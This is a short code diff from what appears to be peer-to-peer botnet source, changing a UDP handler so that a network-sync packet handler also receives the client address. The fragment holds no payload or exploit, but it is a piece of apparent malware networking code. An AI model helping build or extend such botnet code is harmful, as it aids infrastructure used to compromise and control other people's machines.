@@ -158,7 +158,7 @@ static void handle_udp_connections()
 		botnet_topology.addPeer(data, udp_sock);
 		break;
 	case PACK_TYPE::NETWORK_SYNC:
-		botnet_topology.handleSync(data);
+		botnet_topology.handleSync(data, client);
 		break;
 	}
 }
